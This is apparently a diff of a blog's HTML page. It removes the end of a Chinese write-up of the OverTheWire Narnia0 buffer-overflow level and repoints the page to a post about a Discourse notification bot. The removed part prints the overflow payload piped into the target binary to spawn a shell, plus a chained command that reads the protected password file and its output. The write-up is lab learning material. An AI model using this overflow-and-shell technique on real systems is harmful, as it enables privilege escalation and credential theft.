-</code></pre><p>及输出了16进制数<code>41</code>对应的Ascii字符<code>A</code></p>
-<p>那么输出<code>\xef\xbe\xad\xde</code>对应的字符即:</p>
-<pre><code>&gt;&gt;&gt;print &quot;\xef\xbe\xad\xde&quot;
-&gt;&gt;&gt;ﾭ�
-</code></pre><p>但是由于各种奇怪的编码问题这个不存在的字符串你是不可能读懂的，即使能也会是乱码，因为根本没有字符去对应那串16进制码,但是计算机能懂就够了</p>
-<p>于是需要用到Linux中的“管道”功能，即把一个程序的输出作为另一个程序的输入</p>
-<p>例如:<code>netstat -an | grep 445</code><br><code>netstat -an</code>会列出所有端口，而<code>grep 445</code>则会进行筛选，只保留有445这个字符串的结果</p>
-<p>同理,如果要把Python程序的输出结果当做题目程序的输入，同样需要这个技巧</p>
-<pre><code>narnia0@narnia:/narnia$ python -c &#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39; | ./narnia0
-Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
-Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
-val: 0xdeadbeef
-</code></pre><p>这句话:<code>python -c &#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39; | ./narnia0</code></p>
-<p><em>因为在这里不需要进入交互模式，<code>python -c &#39;xxx&#39;</code>命令会直接执行单引号中的代码，而不是在交互中进行<br>如果不加<code>-c</code>参数，直接执行<code>python xxxxx</code> ,系统则会去匹配当前目录下的<code>xxxxx</code>文件试图去用Python解释器执行</em></p>
-<p><em><code>|</code>即为管道，把<code>|</code>左边的输出结果当做输入传递给<code>|</code>右边的程序</em></p>
-<p>这时看变量<code>val</code>的值，已经变成了<code>0xdeadbeef</code>,多出的四个字节成功覆盖在了内存中变量<code>val</code>储存的位置</p>
-<p>再次查看C语言代码</p>
-<pre><code>1.  `if(val==0xdeadbeef)`
-2.  `system(&quot;/bin/sh&quot;);`
-</code></pre><p>如果<code>val</code>的值变成了<code>0xdeadbeef</code>，程序将会调用<code>/bin/sh</code></p>
-<p>第二题的密码在<code>etc/narnia_pass/narnia1</code> 如果直接查看会提示权限不够</p>
-<p>因此运行Python代码同时读取位于<code>etc/narnia_pass/narnia1</code>中的密钥:</p>
-<pre><code>narnia0@narnia:/narnia$ (python -c &#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39;;echo &#39;cat /etc/narnia_pass/narnia1&#39;) | ./narnia0
-Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
-Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
-val: 0xdeadbeef
-efeidiedae
-</code></pre><p>成功显示出了密钥，即下一道题的ssh密码</p>
+<hr>
+<p><em>*转载请注明来自<a href="https://parrotsec-china.org" target="_blank" rel="external">ParrotSec中文社区</a> <a href="https://parrotsec-china.org" target="_blank" rel="external">https://parrotsec-china.org</a></em></p>
 <hr>
 <p><em>*转载请注明来自<a href="https://ares-x.com">AresX’s Blog</a></em></p>
 
@@ -660,8 +691,8 @@ efeidiedae
     <div id="disqus_thread"></div>
 <script type="text/javascript">
     var disqus_config = function () {
-        this.page.url = 'https://ares-x.com/2017/09/02/人生第一道PWN,Overthewire之Narnia0/';  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = 'https://ares-x.com/2017/09/02/人生第一道PWN,Overthewire之Narnia0/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = 'https://ares-x.com/2018/02/21/使用酷Q机器人实现Discourse论坛动态推送/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'https://ares-x.com/2018/02/21/使用酷Q机器人实现Discourse论坛动态推送/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
 </script>
 <script type="text/ls-javascript" id="disqus-thread-script">
@@ -691,21 +722,13 @@ efeidiedae
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2017/09/05/Python图片转换成字符画/" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            新篇
-        </a>
-    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
     
-        <a href="/2017/09/02/编译安装Shadowsocks-qt5/" id="post_nav-older" class="next-content">
+        <a href="/2018/02/14/关于使用Discourse的Webhook和QQbot实现论坛动态推送的记录/" id="post_nav-older" class="next-content">
             旧篇
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
